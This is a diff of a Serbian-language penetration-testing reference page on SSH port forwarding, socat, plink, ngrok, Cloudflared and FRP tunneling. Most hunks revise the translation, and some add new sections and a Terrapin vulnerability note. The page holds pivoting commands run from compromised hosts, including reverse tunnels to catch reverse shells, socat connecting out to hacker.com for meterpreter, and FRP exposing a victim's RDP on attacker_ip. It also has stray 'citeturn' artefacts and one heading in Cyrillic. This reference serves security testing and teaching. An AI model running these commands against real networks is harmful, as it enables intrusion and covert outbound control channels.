@@ -55,9 +55,9 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### Обратно прослеђивање порта
 
-Ovo je korisno za dobijanje obrnute ljuske sa internih hostova kroz DMZ do vašeg hosta:
+Ово је корисно за добијање обрнутог шелла са интерних хостова преко DMZ-а до вашег хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -87,10 +87,14 @@ Postavite novu rutu na klijentskoj strani
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Bezbednost – Terrapin napad (CVE-2023-48795)**
+> Napad na downgrade Terrapin iz 2023. može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tunele. citeturn4search0
+
 ## SSHUTTLE
 
 Možete **tunelovati** putem **ssh** sav **saobraćaj** ka **podmreži** kroz host.\
-Na primer, prosleđivanje savremenog saobraćaja koji ide ka 10.10.10.0/24
+Na primer, prosleđivanje sav saobraćaja koji ide ka 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -219,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Povezivanje agenta i slušanje
+### Veza i Slušanje
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -286,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
+Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -320,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-To je kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).
+To je kao konzolna verzija PuTTY (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo imali obrnutu vezu. Zatim, da bismo prosledili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli imati obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -343,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Morate imati **RDP pristup preko sistema**.\
+Potrebno je imati **RDP pristup preko sistema**.\
 Preuzmite:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service u Windows-u. DVC je odgovoran za **tunelovanje paketa preko RDP veze**.
@@ -360,7 +364,7 @@ Sada možemo **connect** na **victim** preko **RDP** koristeći **`mstsc.exe`**,
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Sada, potvrdite na vašem računaru (napadaču) da port 1080 sluša:
+Sada potvrdite na vašem računaru (napadaču) da port 1080 sluša:
 ```
 netstat -antb | findstr 1080
 ```
@@ -383,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ova alatka se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim, možete koristiti alat po vašem izboru kroz ovaj port.\
-Na primer, prosledite port 443
+Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Na primer, prosledite port 443.
 ```
 Username Alice
 Password P@ssw0rd
@@ -392,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega preko napadačkog porta 2222.\
+Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -442,13 +446,13 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Promena DNS u proxychains
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **defaultu**, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **defaultu** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunelovanje
+## ICMP Tunneling
 
 ### Hans
 
@@ -480,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**\
-_Exposition URI su kao:_ **UID.ngrok.io**
+_URI za izlaganje su kao:_ **UID.ngrok.io**
 
 ### Instalacija
 
@@ -528,7 +532,7 @@ Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.
 Otvara 3 tunela:
 
 - 2 TCP
-- 1 HTTP sa statičkim datotekama izloženim iz /tmp/httpbin/
+- 1 HTTP sa izlaganjem statičkih fajlova iz /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflare-ov `cloudflared` daemon može da kreira izlazne tunele koji izlažu **lokalne TCP/UDP usluge** bez potrebe za ulaznim pravilima vatrozida, koristeći Cloudflare-ovu ivicu kao mesto susreta. Ovo je veoma korisno kada izlazni vatrozid dozvoljava samo HTTPS saobraćaj, dok su ulazne konekcije blokirane.
+
+### Brza komanda za tunel
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Trajni tuneli sa DNS-om
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Pokrenite konektor:
+```bash
+cloudflared tunnel run mytunnel
+```
+Zbog toga što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) je aktivno održavan Go reverzni proxy koji podržava **TCP, UDP, HTTP/S, SOCKS i P2P NAT-hole-punching**. Počevši od **v0.53.0 (maj 2024)** može delovati kao **SSH Tunnel Gateway**, tako da ciljni host može pokrenuti reverzni tunel koristeći samo standardni OpenSSH klijent – nije potreban dodatni binarni fajl.
+
+### Klasični reverzni TCP tunel
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Korišćenje novog SSH prolaza (bez frpc binarne datoteke)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za living-off-the-land pivoting. citeturn2search1
+
 ## Ostali alati za proveru
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
